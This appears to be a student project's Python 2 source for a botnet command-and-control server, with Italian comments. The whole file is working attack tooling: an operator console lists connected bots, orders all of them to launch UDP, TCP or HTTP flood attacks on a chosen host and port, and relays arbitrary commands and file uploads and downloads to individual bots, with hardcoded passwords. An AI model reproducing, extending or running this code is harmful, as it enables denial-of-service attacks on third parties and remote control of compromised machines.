import os
import sys 
import time
import thread
from socket import *

from modules import protocollo

os.system ("clear")
print "##############################################################################"
print "#  Progetto di Advanced Computer Programming                                 #"
print "#  A cura di Salvatore Nitopi												#"
print "##############################################################################"

server_port = 5555
client_password = "password_client"
console_password = "password_console"


try:

	so=socket(AF_INET, SOCK_STREAM)
	so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	so.bind(("0.0.0.0",server_port))
	so.listen(1)

except Exception, e:
	print "\n" + str(e) + "\n"
	sys.exit(-1)



console_sock_l = []
console_addr_l = []

client_sock_l = []
client_addr_l = []


print "[*] Server:\t\tOnline ( Porta: " + str(server_port) + " )"
print "##############################################################################\n"




def log (addr, string, point):
	global log
	try:
		print str(addr) + str(string) + str(point)
		#log += str(addr) + str(string) + "\n"
	except:
		print "[!] Impossibile Loggare"



def client (s, addr):
	try:
		############################################################
		conn = False
		psw = "null"

		try: psw = protocollo.recv(s)
		except: log (addr,"\tCLIENT\t\t[!] Errore: : ", "IC001")

		if psw == client_password:
			conn = True
			log (addr,"\tCLIENT\t\t[*] Password Corretta: ", "IC002")
		else:
			conn = False
			log (addr,"\tCLIENT\t\t[!] Password Err., kicking...: ", "IC003")
		############################################################
		global client_sock_l
		global client_addr_l
		try:
			client_sock_l.append(s)
			client_addr_l.append(addr)
		except:
			s.close()
		############################################################

		while conn:

			try: protocollo.send (s, "<_AREYOUALIVE_>")
			except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EC004"); break

			time.sleep (3)
		
		log (addr,"\tCLIENT\t\t[!] Disconnesso: ", "IC005")
		client_sock_l.remove(s)
		client_addr_l.remove(addr)
		s.close()

	except Exception, e:
		client_sock_l.remove(s)
		client_addr_l.remove(addr)
		s.close()
		print e





def console (s, addr):
	try:
		############################################################
		conn = False
		intr = True
		errr = False
		psw = "null"

		try: psw = protocollo.recv(s)
		except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG001 ")

		if psw == console_password:
			conn = True
			log (addr,"\tCONSOLE\t[*] Password Corretta: ", "IG002")
		else:
			conn = False
			log (addr,"\tCONSOLE\t[!] Password Err., kicking...: ", "IG003")
		############################################################
		global console_sock_l
		global console_addr_l
		try:
			console_sock_l.append(s)
			console_addr_l.append(addr)
		except:
			s.close()
		############################################################
		while conn:

			if errr:
				errr = False
				try: protocollo.send (s, "[!] Client Disconnesso (Errore)\n\n")
				except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG004"); break
				
			############################################################			
			#Ricevo comando
			try: c = protocollo.recv(s)
			except: log (addr,"\tCONSOLE\t[!] Errore: : ", "EG005"); break
			############################################################

			if c == None:
				log (addr,"\tCONSOLE\t[!] Ricevuto None: ", "EG006"); break
				console_sock_l.remove(s)
				console_addr_l.remove(addr)
				auth = False
				conn = False
				s.close()
				break


			elif c == "<_GETPATH_>":
				try: protocollo.send (s, "Server> ")
				except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG007"); break
			

			elif c == "cmd_exit":
				try: protocollo.send (s, "[*] Disconnecting...\n")
				except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG008"); break

				try: protocollo.send (s, "_________________________DISCONNECTCMD\n")
				except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG009"); break

				log (addr,"\tCONSOLE\t[*] Disconnesso: ", "IG010")
				console_sock_l.remove(s)
				console_addr_l.remove(addr)
				auth = False
				conn = False
				s.close()
				break


			elif c == "cmd_list":
				data = ""
				for item in console_addr_l: data += "%d - %s : %s\n" % (console_addr_l.index(item) + 1, str(item[0]), str(item[1]))
				data +="\n"
				for item in client_addr_l: data += "%d - %s : %s\n" % (client_addr_l.index(item) + 1, str(item[0]), str(item[1]))
				
				if (data != ""):
					try: protocollo.send (s, data)
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG011"); break
				else:
					try: protocollo.send (s, "[*] Nessun Client Disponibile.\n")
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG012"); break



			elif c.split()[0] == "global_flood_add":
				try:
					ty = c.split()[1]
					v = c.split()[2]
					p = c.split()[3]
					thr = c.split()[4]
					tim = c.split()[5]
					res = ""

					if (ty != "udp") and (ty != "tcp") and (ty != "http"):
						protocollo.send (s, "[!] Errore, il tipo di flood deve essere <udp> o <tcp> o <http>\n\n")

					else:
						for i in range (0,len(client_sock_l)):
							try:
								protocollo.send (client_sock_l[i], "cmd_flood_add " + ty + " " + v + " " + p + " " + thr + " " + tim)
								check = protocollo.recv (client_sock_l[i])

								if check == "[*] Elemento correttamente aggiunto nella pila flood:\n\tType: " + ty + "\n\tHost:Port: " + v + ":" + p + "\n\tThread_n: " + thr + "\n\tTimeout: " + tim + "\n\n":
									res += str(i+1) + ") Comando inviato a: " + str(client_addr_l[i]) + "\n"
								else:
									res += str(i+1) + ") Comando non inviato a: " + str(client_addr_l[i]) + "\n"

							except:
								res += str(i+1) + "[!] Errore, Comando non inviato a: " + str(client_addr_l[i]) + "\n"

						protocollo.send (s, res)

				except:
					try: protocollo.send (s, "[!] Errore, usa:\ncmd_udp_flood <udp/tcp/http> <host> <port> <n_thread> <timeout>\n\n")
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EA001"); break



			elif c.split()[0] == "global_flood_remove":
				try: 
					res = ""
					for i in range (0,len(client_sock_l)):
						try:
							protocollo.send (client_sock_l[i], "cmd_flood_remove")
							check = protocollo.recv (client_sock_l[i])

							if check == "[*] Elementi correttamente rimossi nella pila flood.\n\n":
								res += str(i+1) + ") Comando inviato a: " + str(client_addr_l[i]) + "\n"
							else:
								res += str(i+1) + ") Comando non inviato a: " + str(client_addr_l[i]) + "\n"

						except:
							res += str(i+1) + "[!] Errore, Comando non inviato a: " + str(client_addr_l[i]) + "\n"

					protocollo.send (s, res)

				except:
					try: protocollo.send (s, "[!] Errore, impossibile rimuovere i flood.\n\n")
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EA001"); break



			elif c.split()[0] == "global_flood_start":
				try: 
					res = ""
					for i in range (0,len(client_sock_l)):
						try:
							protocollo.send (client_sock_l[i], "cmd_flood_start")
							check = protocollo.recv (client_sock_l[i])

							if check == "[*] Attacco avviato...\n\n":
								res += str(i+1) + ") Comando inviato a: " + str(client_addr_l[i]) + "\n"
							else:
								res += str(i+1) + ") Comando non inviato a: " + str(client_addr_l[i]) + "\n"

						except:
							res += str(i+1) + "[!] Errore, Comando non inviato a: " + str(client_addr_l[i]) + "\n"

					protocollo.send (s, res)

				except:
					try: protocollo.send (s, "[!] Errore, impossibile avviare l'attacco.\n\n")
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EA001"); break



			elif "cmd_interact " in c:
				client = int(c.replace("cmd_interact ","")) - 1
				if ((client < len(client_addr_l)) and (client >= 0 )):
					try: protocollo.send (s, "[*] Interagisco con: " + str(client_addr_l[client]) + "\n\n")
					except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG013"); break

					client_sock = client_sock_l[client]

					intr = True

					while intr == True and errr == False:
		
						#Server riceve comando dal console
						try: c = protocollo.recv(s);
						except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG014"); errr = True; break						

				
						if c == "<_GETPATH_>":
							#Server invia comando al client
							try: protocollo.send (client_sock, c);
							except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG015"); errr = True; break

							#Server riceve path dal client
							try: p = protocollo.recv(client_sock);
							except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG016"); errr = True; break

							#Server invia path al console
							try: protocollo.send (s, p);
							except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG017"); errr = True; break


						elif c.split()[0] == "cmd_get":
							#Server invia comando al client
							try: protocollo.send (client_sock, c)
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG019"); errr = True; break

							#Server riceve file dal client
							try: f = protocollo.recv(client_sock);
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG020"); errr = True; break

							#Server invia conferma al console
							try: protocollo.send (s, "[*] Server riceve file, rispedisco...")
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG021"); errr = True; break

							#Server invia file al console
							try: protocollo.send (s, f);
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG022"); errr = True; break



						elif c.split()[0] == "cmd_put":
							#Server invia istruzione al client
							try: protocollo.send (client_sock, c)
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG023"); errr = True; break

							#Server riceve file da console
							try: f = protocollo.recv(s)
							except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG024"); break

							#Server invia conferma al console
							try: protocollo.send (s, "[*] Server riceve file, rispedisco..")
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG025"); errr = True; break

							#Server invia file al client
							try: protocollo.send (client_sock, f)
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG026"); errr = True; break

							#Server invia conferma al console
							try: protocollo.send (s, "[*] Il client ha ricevuto il file.")
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG027"); errr = True; break





						elif c == "cmd_stop":
							try: protocollo.send (s, "[*] Interazione terminata\n\n")
							except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG028"); errr = True; break
							intr = False


						#Altrimenti inoltra il comando
						else:
							#Server invia comando al client
							try: protocollo.send (client_sock, c)
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG029"); errr = True; break

							#Server riceve risposta dal client
							try: f = protocollo.recv(client_sock);
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG0230"); errr = True; break

							#Server invia risposta al console
							try: protocollo.send (s, f);
							except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG031"); errr = True; break

				else:
					try: protocollo.send (s, "[!] ID client sbagliato\n")
					except: log (addr,"\tCLIENT\t\t[!] Errore: ", "EG032"); errr = True; break


			else:
				try: protocollo.send (s, "[!] Comando non riconosciuto\n")
				except: log (addr,"\tCONSOLE\t[!] Errore: ", "EG033"); break



		console_sock_l.remove(s)
		console_addr_l.remove(addr)
		conn = False
		s.close()

	except Exception, e:
		console_sock_l.remove(s)
		console_addr_l.remove(addr)
		conn = False
		s.close()
		print e




def main():
	while True:
		try:
			
			so_connection, so_address = so.accept()

			#Ricevo il tipo di client
			try: client_type = protocollo.recv(so_connection)
			except Exception, e: print e
			#except: print str(so_address) + "\tCLIENT\t\t[!] Errore: "

			if client_type == "<_CONSOLE_>": 
				so_connection.settimeout(None)
				log (so_address, "\tCONSOLE\t[*] Connesso: ", "IS01")
				thread.start_new_thread ( console, (so_connection, so_address,) )
				
			elif client_type == "<_CLIENT_>":  
				so_connection.settimeout(None)
				log (so_address, "\tCLIENT\t\t[*] Connesso: ", "IS02")
				thread.start_new_thread ( client, (so_connection, so_address,) )

			elif client_type == "<_TESTER_>": 
				log (so_address, "\tTESTER\t\t[*] Connesso: ", "IS03")
				#so_connection.close()
				log (so_address, "\tTESTER\t\t[*] Connessione chiusa: ", "IS04")

			else:
				log (so_address, "\tUNKNOWN\t\t[*] Connesso: ", "IS05")
				so_connection.close()
				log (so_address, "\tUNKNOWN\t\t[*] Connessione chiusa: ", "IS06")
			

		except timeout:
			print "Timeout"
		
		except Exception, e:
			so_connection.close()
			print e



def kill_all ():
	for item in console_sock_l:
		try:
			item.close()
		except: #Connection already closed
			print ("[!] ERRORE CHIUSURA")

	for item in client_sock_l:
		try:
			item.close()
		except: #Connection already closed
			print ("[!] ERRORE CHIUSURA")

	del console_sock_l[:]
	del client_sock_l[:]




try:
	main ()

except Exception as e:
	kill_all ()
	print (e)

except KeyboardInterrupt:
	print "[*] STOPPING SERVER..."
	kill_all ()
	print "[!] ___SERVER KILLED____"

	






